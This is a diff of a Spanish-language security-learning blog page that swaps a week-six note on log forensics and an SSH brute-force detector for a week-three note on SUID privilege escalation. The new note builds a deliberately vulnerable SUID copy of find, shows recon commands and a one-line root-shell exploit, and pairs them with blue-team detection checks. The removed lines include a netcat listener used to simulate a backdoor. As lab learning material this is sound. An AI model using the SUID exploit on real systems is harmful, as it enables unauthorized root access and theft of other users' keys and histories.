@@ -131,6 +131,12 @@ footer { position: relative; z-index: 1; border-top: 1px solid var(--border); pa
 .reveal-delay-1{transition-delay:.1s}.reveal-delay-2{transition-delay:.2s}
 
 @media(max-width:900px){header{padding:0 24px}.status-badge{display:none}.article-wrap{padding:90px 24px 60px}.article-body{grid-template-columns:1fr}.toc{position:static;margin-bottom:40px}.week-nav{padding:24px}.footer{padding:32px 24px;flex-direction:column;gap:16px;text-align:center}}
+
+/* FIGURES (screenshots) */
+figure { margin: 28px 0; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; background: var(--bg-code); }
+figure img { display: block; width: 100%; height: auto; border-bottom: 1px solid var(--border); }
+figcaption { padding: 12px 16px; font-family: var(--ff-mono); font-size: 11.5px; line-height: 1.55; color: var(--text-muted); }
+figcaption b { color: var(--text-sec); font-weight: 500; }
 </style>
 </head>
 <body>
@@ -160,110 +166,48 @@ footer { position: relative; z-index: 1; border-top: 1px solid var(--border); pa
     fase 1 completa
   </div>
 </header>
-
 <div class="article-wrap">
   <div class="article-meta reveal">
-    <span>Semana 06</span>
+    <span>Semana 03</span>
     <span class="sep">/</span>
-    <span>Forense · Detección · Bash</span>
+    <span>SUID · /etc/shadow · Privesc</span>
   </div>
 
-  <h1 class="reveal reveal-delay-1">Forense de logs y <em>detección activa.</em></h1>
-  <p class="lede reveal reveal-delay-2">Esta semana pasé de analizar cosas en modo lectura a construir herramientas que detectan cosas solas. La diferencia es más grande de lo que esperaba.</p>
+  <h1 class="reveal reveal-delay-1">SUID, `/etc/shadow` y <em>escalada de privilegios.</em></h1>
+  <p class="lede reveal reveal-delay-2">Acá hizo click todo lo de permisos. Un bit especial —el SUID— explica cómo un usuario común termina siendo root con una sola línea. Monté un laboratorio vulnerable a propósito para verlo pasar de los dos lados.</p>
 
   <div class="article-body">
     <nav class="toc reveal">
       <div class="toc-label">En esta nota</div>
-      <ol>
-        <li><a href="#backdoor">Backdoor en tiempo real</a></li>
-        <li><a href="#triage">Script de triaje</a></li>
-        <li><a href="#logs">Forense de logs</a></li>
-        <li><a href="#ssh">SSH brute force</a></li>
-        <li><a href="#conceptos">Conceptos clave</a></li>
-        <li><a href="#confusiones">Lo que no entendía</a></li>
-        <li><a href="#pendiente">Pregunta pendiente</a></li>
-      </ol>
+      <ol><li><a href="#suid">Qué es el bit SUID</a></li><li><a href="#passwd">Por qué passwd necesita SUID (y por qué es seguro)</a></li><li><a href="#lab">El laboratorio: crear la vulnerabilidad</a></li><li><a href="#exploit">El exploit — una sola línea</a></li><li><a href="#limpieza">Post-explotación y limpieza — la visión del Blue Team</a></li><li><a href="#confusiones">Lo que no entendía al principio</a></li><li><a href="#profesional">Conexión con el mundo profesional</a></li><li><a href="#pendiente">Pregunta pendiente y próximo paso</a></li></ol>
     </nav>
 
     <div class="prose reveal reveal-delay-1">
 
-      <h2 id="backdoor"><span class="num">§ 01</span> Backdoor en tiempo real</h2>
-      <p>Arranqué la semana simulando un proceso malicioso con <code>nc -lvnp 9999</code> en mi VM. El objetivo era encontrarlo como si no supiera que estaba ahí. Usé <code>lsof -i :9999</code> para identificar el proceso dueño del puerto, tracé el árbol de padres con <code>ps auxf</code>, e inspeccioné el binario real via <code>/proc/&lt;PID&gt;/exe</code>.</p>
-      <p>Algo que me llamó la atención: el proceso aparecía dos veces en <code>ss</code>. Tardé un rato en entender por qué. Tiene dos file descriptors simultáneos — <code>fd=3</code> para seguir escuchando y <code>fd=4</code> para mantener la conexión activa.</p>
-
-      <div class="code-block">
-        <div class="code-head">
-          <div class="code-dots"><span></span><span></span><span></span></div>
-          <span class="code-file">~/scripts/<b>triage-rapido.sh</b></span>
-          <span class="code-lang">bash</span>
-        </div>
-        <div class="code-body">
-          <div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span></div>
-          <div class="code-lines"><span class="ln"><span class="tok-cmt"># detectar proceso dueño de un puerto</span></span><span class="ln"><span class="tok-fn">lsof</span> -i :<span class="tok-num">9999</span></span><span class="ln"></span><span class="ln"><span class="tok-cmt"># inspeccionar el binario real detrás del PID</span></span><span class="ln"><span class="tok-fn">ls</span> -la /proc/<span class="tok-var">&lt;PID&gt;</span>/exe</span><span class="ln"><span class="tok-fn">cat</span> /proc/<span class="tok-var">&lt;PID&gt;</span>/cmdline</span></div>
-        </div>
-      </div>
-
-      <h2 id="triage"><span class="num">§ 02</span> Script de triaje</h2>
-      <p>Construí <code>triage.sh</code> desde cero. Revisa procesos por CPU, conexiones establecidas, ejecutables en <code>/tmp</code>, binarios SUID y persistencia en cron. Al final genera un reporte con timestamp y lo manda por email via <code>msmtp</code>.</p>
-      <p>El problema más frustrante fue un loop infinito cuando intenté que el script se llamara a sí mismo. La solución fue reorganizar todo en funciones internas llamadas secuencialmente desde un <code>main()</code>.</p>
-
-      <div class="callout">
-        <span class="callout-label">↳ Aprendizaje de diseño</span>
-        <p>Las credenciales viven en archivos con <code>chmod 600</code>, nunca hardcodeadas en el script. Parece obvio escrito así, pero es fácil ignorarlo cuando estás probando rápido.</p>
-      </div>
-
-      <h2 id="logs"><span class="num">§ 03</span> Forense de logs</h2>
-      <p>Generé evidencia real en mi Ubuntu 24.04 — intentos fallidos de sudo, acceso a <code>/etc/shadow</code> — y la rastreé en <code>auth.log</code> y <code>journalctl</code> hasta construir una timeline completa del incidente.</p>
-      <p>Un detalle que no esperaba: <code>grep</code> en logs modernos de Ubuntu devolvía "coincidencia en fichero binario". Ubuntu 24.04 escribe partes binarias en los logs. Se resuelve con <code>-a</code>, o usando <code>journalctl</code> directamente.</p>
-
-      <div class="code-block">
-        <div class="code-head">
-          <div class="code-dots"><span></span><span></span><span></span></div>
-          <span class="code-file">/var/log/<b>auth.log</b></span>
-          <span class="code-lang">bash</span>
-        </div>
-        <div class="code-body">
-          <div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span></div>
-          <div class="code-lines"><span class="ln"><span class="tok-cmt"># buscar en logs con partes binarias</span></span><span class="ln"><span class="tok-fn">grep</span> -aE <span class="tok-str">"Failed|Invalid"</span> /var/log/auth.log</span><span class="ln"></span><span class="ln"><span class="tok-fn">journalctl</span> --since <span class="tok-str">"2026-05-01"</span> --until <span class="tok-str">"2026-05-02"</span></span></div>
-        </div>
-      </div>
-
-      <h2 id="ssh"><span class="num">§ 04</span> SSH brute force + detector</h2>
-      <p>Simulé 200 intentos de login fallidos contra mi VM con un loop <code>for</code> + <code>ssh</code>. Después construí el detector: extrae IPs con <code>awk</code>, cuenta con <code>uniq -c</code>, bloquea via <code>ufw deny</code> al superar el umbral, notifica por email. Lo automaticé con cron cada 5 minutos.</p>
-      <p>El problema más raro: el email funcionaba manual pero desde cron no salía nada. Cron hereda el entorno del usuario ejecutor — mover la tarea al crontab de root resolvió el acceso a <code>.msmtprc</code>.</p>
-
-      <div class="code-block">
-        <div class="code-head">
-          <div class="code-dots"><span></span><span></span><span></span></div>
-          <span class="code-file">~/scripts/<b>ssh-brute-detector.sh</b></span>
-          <span class="code-lang">bash</span>
-        </div>
-        <div class="code-body">
-          <div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span></div>
-          <div class="code-lines"><span class="ln"><span class="tok-cmt"># extraer IPs con más de N intentos fallidos</span></span><span class="ln"><span class="tok-fn">grep</span> <span class="tok-str">"Failed password"</span> /var/log/auth.log \</span><span class="ln">  | <span class="tok-fn">awk</span> <span class="tok-str">'{print $11}'</span> \</span><span class="ln">  | <span class="tok-fn">sort</span> | <span class="tok-fn">uniq</span> -c | <span class="tok-fn">sort</span> -rn \</span><span class="ln">  | <span class="tok-fn">awk</span> <span class="tok-str">'$1 > 10 {print $2}'</span></span><span class="ln"></span><span class="ln"><span class="tok-cmt"># bloquear con UFW</span></span><span class="ln"><span class="tok-fn">ufw</span> deny from <span class="tok-var">$IP</span></span></div>
-        </div>
-      </div>
-
-      <h2 id="conceptos"><span class="num">§ 05</span> Conceptos clave</h2>
-      <p><strong>Separar código de configuración.</strong> Las credenciales en archivos con permisos restringidos, nunca en el script. Cada proceso hereda el entorno del usuario que lo lanza — eso explica el 80% de los problemas raros con scripts automatizados.</p>
-      <p><strong>Baseline.</strong> Saber qué es normal en un sistema es el prerequisito para identificar qué es realmente anómalo. Sin eso, cualquier proceso legítimo parece sospechoso.</p>
-
+      <h2 id="suid"><span class="num">§ 01</span> Qué es el bit SUID</h2>
+      <p>Normalmente un programa corre con los permisos del usuario que lo lanza. Con <strong>SUID activo, corre con los permisos del dueño del archivo</strong>, no del que lo ejecuta. La analogía que me lo fijó: es un traje colgado en la puerta; cualquiera que se lo pone actúa con los permisos del dueño del traje. Si el traje es de root, esa persona hace lo que quiera.</p>
+      <p>Se ve en <code>ls -la</code> como una <code>s</code> en lugar de la <code>x</code> del dueño:</p>
+      <div class="code-block"><div class="code-head"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-file">terminal</span><span class="code-lang">bash</span></div><div class="code-body"><div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></div><div class="code-lines"><span class="ln"><span class="tok-cmt"># SUID activo (la 's') — se ejecuta como el dueño</span></span><span class="ln">-rwsr-xr-x  root root  /usr/bin/passwd</span><span class="ln"></span><span class="ln"><span class="tok-cmt"># sin SUID (la 'x' normal) — se ejecuta como vos</span></span><span class="ln">-rwxr-xr-x  root root  /usr/bin/ls</span></div></div></div>
+      <h2 id="passwd"><span class="num">§ 02</span> Por qué passwd necesita SUID (y por qué es seguro)</h2>
+      <p><code>passwd</code> tiene SUID porque necesita escribir en <code>/etc/shadow</code>, que solo root toca. Pero es seguro porque fue programado con restricciones: verifica tu identidad antes de actuar, modifica solo tu línea y no te deja escapar a una shell. La diferencia con los binarios peligrosos es esa: qué te dejan hacer una vez adentro.</p>
+      <div class="table-wrap"><table><thead><tr><th>Binario</th><th>¿SUID necesario?</th><th>Por qué</th></tr></thead><tbody><tr><td><code>passwd</code></td><td>Sí</td><td>Debe escribir en <code>/etc/shadow</code></td></tr><tr><td><code>sudo</code> / <code>su</code></td><td>Sí</td><td>Su función completa requiere root</td></tr><tr><td><code>find</code></td><td>No</td><td>Solo busca archivos — con SUID da shell root</td></tr><tr><td><code>python3</code></td><td>No</td><td>Intérprete genérico — una línea y sos root</td></tr><tr><td><code>bash</code> / <code>vim</code></td><td>No</td><td>Shell o editor directo — root inmediato</td></tr><tr><td>cualquier cosa en <code>/tmp</code></td><td>Nunca</td><td><code>/tmp</code> es escribible por todos — es una backdoor</td></tr></tbody></table></div>
+      <h2 id="lab"><span class="num">§ 03</span> El laboratorio: crear la vulnerabilidad</h2>
+      <p>Para entender el ataque primero lo construí. Copié <code>find</code> a <code>/tmp</code>, le activé el SUID con dueño root, y me cambié a un usuario víctima sin privilegios.</p>
+      <div class="code-block"><div class="code-head"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-file">terminal</span><span class="code-lang">bash</span></div><div class="code-body"><div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span></div><div class="code-lines"><span class="ln"><span class="tok-cmt"># preparar el binario vulnerable</span></span><span class="ln">sudo cp /usr/bin/find /tmp/find_vulnerable</span><span class="ln">sudo chmod u+s /tmp/find_vulnerable   # = chmod 4755</span><span class="ln"></span><span class="ln"><span class="tok-cmt"># entrar como usuario sin privilegios (simula el CTF)</span></span><span class="ln">su - victima</span></div></div></div>
+      <h2 id="exploit"><span class="num">§ 04</span> El exploit — una sola línea</h2>
+      <p>Reconocimiento primero: <code>whoami</code>, <code>id</code>, y el comando clave para buscar binarios SUID en todo el sistema. Después, GTFOBins te da el exploit exacto para cada uno.</p>
+      <div class="code-block"><div class="code-head"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-file">terminal</span><span class="code-lang">bash</span></div><div class="code-body"><div class="code-gutter"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span></div><div class="code-lines"><span class="ln"><span class="tok-cmt"># buscar todos los binarios SUID</span></span><span class="ln">find / -perm -u=s -type f 2&gt;/dev/null</span><span class="ln"></span><span class="ln"><span class="tok-cmt"># el exploit: find lanza /bin/sh heredando euid=0</span></span><span class="ln">/tmp/find_vulnerable . -exec /bin/sh -p \;</span><span class="ln"></span><span class="ln"><span class="tok-cmt"># verificar</span></span><span class="ln">whoami   # -&gt; root</span></div></div></div>
+      <p><strong>Por qué funciona:</strong> <code>find</code> con <code>-exec</code> lanza <code>/bin/sh</code> como proceso hijo, y ese hijo hereda el euid=0 del padre. La shell nace siendo root. El flag <code>-p</code> es clave en sistemas modernos: bash degrada privilegios al abrir una shell interactiva, y <code>-p</code> fuerza a preservar la identidad efectiva. Ahí entendí la diferencia entre <strong>uid</strong> (quién sos) y <strong>euid</strong> (con qué permisos actuás ahora mismo).</p>
+      <div class="callout crit"><span class="callout-label">↳ Los dos lados</span><p>Cada fase de ataque tiene su espejo defensivo. Un binario SUID en <code>/tmp</code> es alarma roja inmediata en una auditoría — porque sé exactamente lo que hace un atacante con él.</p></div>
+      <h2 id="limpieza"><span class="num">§ 05</span> Post-explotación y limpieza — la visión del Blue Team</h2>
+      <p>Con root, la privacidad de todos los demás usuarios desaparece: leés sus <code>.bash_history</code> (a veces con contraseñas escritas por error), sus llaves SSH, cambiás sus claves. La parte que más me sirvió fue el cleanup al revés: si sé qué borra un atacante, sé qué buscar para detectarlo.</p>
+      <div class="table-wrap"><table><thead><tr><th>Vector de detección</th><th>Qué busca el Blue Team</th></tr></thead><tbody><tr><td><code>/var/log/auth.log</code></td><td>Cada <code>sudo</code>, <code>su</code> y cambio de usuario queda registrado</td></tr><tr><td><code>find / -nouser</code></td><td>Archivos huérfanos de un usuario borrado apurado</td></tr><tr><td>Binarios en <code>/tmp</code></td><td>Cualquier ejecutable ahí es sospechoso</td></tr><tr><td>Timestamps anómalos</td><td>Un archivo recién modificado en <code>/etc</code> es señal</td></tr></tbody></table></div>
       <h2 id="confusiones"><span class="num">§ 06</span> Lo que no entendía al principio</h2>
-      <div class="table-wrap">
-        <table>
-          <thead><tr><th>Confusión</th><th>Cómo lo resolví</th></tr></thead>
-          <tbody>
-            <tr><td>Por qué excluir loopback al buscar conexiones sospechosas</td><td>El loopback es tráfico interno — nunca sale a la red</td></tr>
-            <tr><td>Por qué el mismo PID aparece dos veces en <code>ss</code></td><td>Dos file descriptors: fd=3 escucha, fd=4 mantiene la conexión</td></tr>
-            <tr><td>Por qué un virus sigue corriendo si borrás el ejecutable</td><td>El proceso ya está en RAM; usa cron para reaparecer al reiniciar</td></tr>
-            <tr><td>Por qué <code>grep</code> devolvía "fichero binario"</td><td>Ubuntu 24.04 escribe logs con partes binarias — se resuelve con <code>-a</code></td></tr>
-            <tr><td>Por qué el email funcionaba manual pero no desde cron</td><td>Cron hereda el entorno del usuario — mover a crontab de root solucionó el acceso a <code>.msmtprc</code></td></tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h2 id="pendiente"><span class="num">§ 07</span> Pregunta pendiente</h2>
-      <p>¿Cómo hace Fail2Ban para bloquear IPs automáticamente por tiempo limitado y desbloquearlas solas sin intervención humana? Lo que armé bloquea, pero no desbloquea solo.</p>
+      <div class="table-wrap"><table><thead><tr><th>Confusión</th><th>Cómo lo resolví</th></tr></thead><tbody><tr><td>Por qué <code>find</code> es peligroso y <code>passwd</code> no, si los dos tienen SUID</td><td><code>find -exec</code> te deja ejecutar cualquier cosa; <code>passwd</code> tiene restricciones internas</td></tr><tr><td>Qué diferencia hay entre uid y euid</td><td>uid es tu identidad real; euid es con qué permisos actuás — para el sistema manda el euid</td></tr><tr><td>Para qué sirve el <code>-p</code> en <code>/bin/sh -p</code></td><td>Evita que bash degrade el euid=0 a tu usuario real al abrir la shell</td></tr><tr><td>Por qué se llama <code>passwd</code> si no guarda contraseñas</td><td>Herencia de Unix: antes las guardaba, después las movieron a <code>/etc/shadow</code></td></tr></tbody></table></div>
+      <h2 id="profesional"><span class="num">§ 07</span> Conexión con el mundo profesional</h2>
+      <p>Este es el corazón de la escalada de privilegios local, y aparece en casi todos los CTF de nivel entrada e intermedio. GTFOBins es la biblia. Del lado defensivo, revisar el baseline de binarios SUID (<code>find / -perm -u=s -type f &gt; baseline.txt</code>) y compararlo en el tiempo es un control real de hardening.</p>
+      <h2 id="pendiente"><span class="num">§ 08</span> Pregunta pendiente y próximo paso</h2>
+      <p>Con <code>find</code>, <code>python3</code>, <code>bash</code>, <code>vim</code> y <code>perl</code> dominados, el próximo vector es <code>sudo -l</code>. Pero antes tocaba consolidar todo con las manos en la masa: arrancar <strong>OverTheWire Bandit</strong> desde el nivel 0.</p>
 
       <div class="sign-off">— fv</div>
     </div>
@@ -271,8 +215,8 @@ footer { position: relative; z-index: 1; border-top: 1px solid var(--border); pa
 </div>
 
 <div class="week-nav">
-  <a href="semana-05.html">← Semana 05 · Correlación de procesos y red</a>
-  <a href="semana-07.html">Semana 07 · Fail2Ban y forense web →</a>
+  <a href="semana-02.html">← Semana 02 · Linux desde cero</a>
+  <a href="semana-04.html">Semana 04 · OverTheWire Bandit →</a>
 </div>
 
 <footer>
